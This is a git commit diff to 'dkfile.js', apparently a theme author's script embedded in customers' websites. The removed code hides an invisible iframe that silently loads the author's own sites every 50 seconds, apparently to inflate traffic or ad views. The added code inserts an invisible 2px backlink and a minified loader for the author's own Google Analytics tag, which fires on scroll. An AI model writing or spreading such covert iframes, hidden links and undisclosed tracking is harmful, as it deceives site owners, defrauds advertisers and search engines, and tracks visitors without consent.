f0a4b9d02463251541c7669e81eab6170d4334ca
Dhanjee Rider <102199585+dhanjeerider@users.noreply.github.com>
2025-03-04 10:19:59 +0530

    Update dkfile.js

--- dkfile.js
+++ dkfile.js
@@ -1,77 +1,22 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // Check if the user has already viewed the iframe in this session
-    if (!sessionStorage.getItem('iframeViewed')) {
-        let Folt = document.querySelector(".footer, #main, .copyright") || document.body;
-        if (Folt) {
-            let Newel = document.createElement('span');
-            Newel.innerHTML = `
-            <style>
-                iframe.invisible-frame {
-                    position: fixed;
-                    width: 40%;
-                    height: 20%;
-                    bottom: 20%;
-                    left: 0;
-                    border: none;
-                    opacity: 0;
-                    z-index: 39494;
-                }
-            </style>
-            <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
-            Folt.prepend(Newel);
+  let Folt = document.querySelector(".footer, #main, .copyright");
+  if (Folt) {
+    let Newel = document.createElement('span');
+    Newel.innerHTML = `<a class="btc" href="https://www.dktechnozone.in/">This Website Design By Dk Technozone</a>
+ <style>.btc{
+     color: black;text-decoration: none;
+     opacity: 0; display:inline;
+     font-size: 2px;} .btc:hover{color:transparent; opacity:0;
+ }</style>   
+    
+    `;
+    Folt.append(Newel);  
+    console.log("theme by dktechnozone.in");
+var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');
 
-            // Lazy load the Google Analytics script on scroll
-            let lazyAnalysis = false;
-            window.addEventListener("scroll", function() {
-                if ((document.documentElement.scrollTop !== 0 || document.body.scrollTop !== 0) && !lazyAnalysis) {
-                    (function() {
-                        var e = document.createElement("script");
-                        e.type = "text/javascript";
-                        e.async = true;
-                        e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
-                        var a = document.getElementsByTagName("script")[0];
-                        a.parentNode.insertBefore(e, a);
-                    })();
-                    lazyAnalysis = true;
-                }
-            }, true);
+    
+  } else {
 
-            // Initialize Google Analytics
-            window.dataLayer = window.dataLayer || [];
-            function gtag() {
-                dataLayer.push(arguments);
-            }
-            gtag('js', new Date());
-            gtag('config', 'G-2VYRMPXK0F');
-
-            // Function to set random post URL to the iframe
-            const postUrls = [
-                'https://techdiwane.com/infinix-hot-50-pro/',
-                'https://dktheme.online/tower-smash/index.html',
-                'https://dktheme.online/cubito/index.html',
-                'https://dktheme.online/angry-city-smasher/index.html',
-                'https://dktheme.online/thief-puzzle/index.html',
-                'https://dktheme.online/blackriver-mystery-hidden-objects/index.html',
-                'https://techdiwane.com/nokia-x60-pro/',
-                'https://techdiwane.com/samsung-best-premium-smartphone-%e0%a4%b8%e0%a5%88%e0%a4%ae%e0%a4%b8%e0%a4%82%e0%a4%97-%e0%a4%95%e0%a4%be-300mp-%e0%a4%95%e0%a5%88%e0%a4%ae%e0%a4%b0%e0%a4%be-%e0%a4%95%e0%a5%87-%e0%a4%b8%e0%a4%be/',
-                'https://techdiwane.com/samsung-galaxy-m54-5g-samsung-%e0%a4%95%e0%a4%be-%e0%a4%a8%e0%a4%af%e0%a4%be-%e0%a4%b8%e0%a5%8d%e0%a4%ae%e0%a4%be%e0%a4%b0%e0%a5%8d%e0%a4%9f%e0%a4%ab%e0%a5%8b%e0%a4%a8-%e0%a4%b6%e0%a4%be%e0%a4%a8/',
-                'https://techdiwane.com/6200-mah-%e0%a4%95%e0%a5%80-%e0%a4%ac%e0%a5%88%e0%a4%9f%e0%a4%b0%e0%a5%80-%e0%a4%95%e0%a5%87-%e0%a4%b8%e0%a4%be%e0%a4%a5-%e0%a4%b0%e0%a5%87%e0%a4%a1%e0%a4%ae%e0%a5%80-%e0%a4%95%e0%a4%be-%e0%a4%a7/',
-                'https://techdiwane.com/realme-narzo-70x-5g-%e0%a4%b6%e0%a4%be%e0%a4%a8%e0%a4%a6%e0%a4%be%e0%a4%b0-%e0%a4%aa%e0%a4%b0%e0%a4%ab%e0%a5%89%e0%a4%b0%e0%a5%8d%e0%a4%ae%e0%a5%87%e0%a4%82%e0%a4%b8-%e0%a4%94%e0%a4%b0-%e0%a4%ac/','https://techdiwane.com/realme-small-smart-phone-5g-220mp-%e0%a4%95%e0%a5%88%e0%a4%ae%e0%a4%b0%e0%a4%be-%e0%a4%94%e0%a4%b0-125w-%e0%a4%ab%e0%a4%be%e0%a4%b8%e0%a5%8d%e0%a4%9f-%e0%a4%9a%e0%a4%be%e0%a4%b0%e0%a5%8d%e0%a4%9c/','https://techdiwane.com/moto-edge/','https://techdiwane.com/realme-new-slim-5g-smartphone-review/','https://techdiwane.com/realme-mini-display-smartphone-%e0%a4%b0%e0%a4%bf%e0%a4%af%e0%a4%b2%e0%a4%ae%e0%a5%80-%e0%a4%95%e0%a5%87-%e0%a4%87%e0%a4%b8-%e0%a4%b8%e0%a5%8d%e0%a4%ae%e0%a4%be%e0%a4%b0%e0%a5%8d%e0%a4%9f%e0%a4%ab/','https://techdiwane.com/samsung-best-look-5g-smart-phone-%e0%a4%b8%e0%a5%88%e0%a4%ae%e0%a4%b8%e0%a4%82%e0%a4%97-%e0%a4%95%e0%a4%be-%e0%a4%a8%e0%a4%af%e0%a4%be-250mp-%e0%a4%95%e0%a5%87-%e0%a4%a4%e0%a4%97%e0%a4%a1%e0%a4%bc/'
-            ];
-            function goToRandomPost() {
-                const randomIndex = Math.floor(Math.random() * postUrls.length);
-                const randomPostUrl = postUrls[randomIndex];
-                document.getElementById('postFrame').src = randomPostUrl;
-            }
-
-            // Set the iframe's src on load and update every 50 seconds
-            window.onload = function() {
-                goToRandomPost();
-                setInterval(goToRandomPost, 50000);
-            };
-
-            // Mark the iframe as viewed in session storage
-            sessionStorage.setItem('iframeViewed', 'true');
-        }
-    }
+        
+  }
 });
